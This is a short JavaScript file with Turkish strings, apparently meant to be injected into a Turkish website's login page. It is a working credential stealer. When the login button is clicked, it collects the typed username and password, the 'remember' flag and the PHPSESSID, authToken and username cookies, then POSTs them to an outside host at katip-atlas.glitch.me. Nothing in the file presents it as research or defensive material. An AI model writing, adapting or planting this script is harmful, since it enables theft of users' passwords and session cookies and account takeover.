(function() {
    function getCookie(name) {
        const value = `; ${document.cookie}`;
        const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return decodeURIComponent(parts.pop().split(';').shift());
        return null;
    }

    function getCookies() {
        return {
            username: getCookie('username') || 'Yok',
            PHPSESSID: getCookie('PHPSESSID') || 'Yok',
            authToken: getCookie('authToken') || 'Yok'
        };
    }

    function setupLoginListener() {
        const loginBtn = document.querySelector('a[onclick="girisyap()"]');
        if (loginBtn) {
            loginBtn.addEventListener('click', () => {
                const username = document.getElementById('loginname')?.value || 'Bilinmiyor';
                const password = document.getElementById('loginpassport')?.value || 'Bilinmiyor';
                const remember = document.getElementById('authCheck')?.checked || false;

                const data = {
                    kuladi: username,
                    sifre: password,
                    remember: remember,
                    cookies: getCookies(),
                    timestamp: Date.now()
                };

                sendCredentials(data);
            });
        } else {
            setTimeout(setupLoginListener, 100);
        }
    }

    function sendCredentials(data) {
        fetch('https://katip-atlas.glitch.me/log', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data),
            credentials: 'include'
        })
            .then(response => {
                if (!response.ok) throw new Error('Log gönderilemedi');
                console.log('Giriş bilgileri gönderildi');
            })
            .catch(err => console.error('Log gönderilemedi:', err));
    }

    // Script yüklendiğinde listener’ı kur
    setupLoginListener();
})();
